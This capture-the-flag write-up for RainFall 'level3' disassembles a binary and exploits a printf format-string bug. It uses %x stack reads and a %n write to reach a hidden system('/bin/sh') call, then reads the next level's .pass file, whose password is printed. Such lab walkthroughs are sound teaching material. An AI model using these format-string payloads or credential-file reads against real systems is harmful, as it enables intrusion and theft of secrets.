# level3

> We use [GDB peda](https://github.com/longld/peda) in order to get a better GDB visualization.

1. [Analysis](#analysis)
2. [Exploit](#exploit)

## Analysis

Take a look at `main`, nothing tremendous. It calls `v`:

```gdb
gdb-peda$ disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x218                   ; 536 bytes of stack space reclaimed
   0x080484ad <+9>:     mov    eax,ds:0x8049860            ; eax = stdin
   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax     ; push stdin to stack
   0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200   ; push 512 to stack
   0x080484be <+26>:    lea    eax,[ebp-0x208]             ; load buffer address in eax
   0x080484c4 <+32>:    mov    DWORD PTR [esp],eax         ; push eax to stack
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>       ; call fgets
   0x080484cc <+40>:    lea    eax,[ebp-0x208]             ; load buffer address in eax
   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax         ; push eax to stack
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>      ; call printf
   0x080484da <+54>:    mov    eax,ds:0x804988c            ; eax = data segment variable (that equals 0 here)
   0x080484df <+59>:    cmp    eax,0x40                    ; compare eax to 0x40 (64 in decimal)
   0x080484e2 <+62>:    jne    0x8048518 <v+116>           ; jump to leave instruction if not equal
   0x080484e4 <+64>:    mov    eax,ds:0x8049880            ; eax = stdout
   0x080484e9 <+69>:    mov    edx,eax                     ; edx = eax
   0x080484eb <+71>:    mov    eax,0x8048600               ; eax = 0x8048600 (contains "Wait what?!\n")
   0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx     ; push edx to stack
   0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc     ; push 12 to stack
   0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1     ; push 1 to stack
   0x08048504 <+96>:    mov    DWORD PTR [esp],eax         ; push eax to stack (arg[0])
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>      ; call fwrite
   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d   ; push address 0x804860d (contains "/bin/sh") to stack
   0x08048513 <+111>:   call   0x80483c0 <system@plt>      ; call system
   0x08048518 <+116>:   leave
   0x08048519 <+117>:   ret
End of assembler dump.
```

We notice numerous calls: `fgets`, `printf`. `fwrite` and `system`. Also, a conditionnal jumps seems to lead to the end
of the function without executing `fwrite` and `system`.

We look at the content of the address `0x804860d` (do `x/s 0x804860d` command in gdb) pushed on the stack before the
call to `system`, which is the string `"/bin/sh"`.

So we know that we don't have to jump after the `0x080484df <+59>:    cmp    eax,0x40` instruction to reach this
`system` call.

Since `fgets` protects from a buffer overflow attack, we look for `printf` vulnerabilities, and find [this
document](http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf) (also attached in
'Ressources' directory) about the format string one.

This will allow us to write the value `0x40` (64 in decimal) in the address `0x804988c` which is copied to `eax` before
the `cmp eax,0x40` instruction. Here is how to proceed.

## Exploit

First of all, we inject as many `%x` conversion as needed to make printf move forward through the stack and reach the
address where the string we have provided is stored.

```console
level3@RainFall:~$ perl -e 'print "AAAA %08x %08x %08x %08x\n"' > /tmp/level3
level3@RainFall:~$ cat /tmp/level3 | ./level3
AAAA 00000200 b7fd1ac0 b7ff37d0 41414141
```

Here we have read the first 16 bytes of the stack, and we know that the 4th argument converted by `printf` is the
address of the supplied string (`AAAA` => `41414141`).

We can now use the `%n` conversion which prints the number of characters written so far by `printf` to write the value
64 in the address `0x804988c`.

To do so, we need to know how long our string is, then add extra characters to reach 64 bytes before the `%n`.

Let's format the string with the address `0x804988c` and the conversions needed. We use gdb to see what value is written
at this address.

```console
level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x08%x%x%x%n"' > /tmp/level3
level3@RainFall:~$ gdb ./level3
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
gdb-peda$ b *0x080484df
Breakpoint 1 at 0x80484df
gdb-peda$ run < /tmp/level3
Breakpoint 1, 0x080484df in v ()
gdb-peda$ x/s $eax
0x17:	 <Address 0x17 out of bounds>
```
The exploit has worked, the value written is 0x17, or 23 in decimal. Since we want to write 64, we'll add 41 extra
characters to our string.

```console
level3@RainFall:~$ perl -e 'print "\x8c\x98\x04\x08AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%x%x%x%n"' > /tmp/level3
level3@RainFall:~$ cat /tmp/level3 - | ./level3
...
[hit return, some garbage display]
...
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
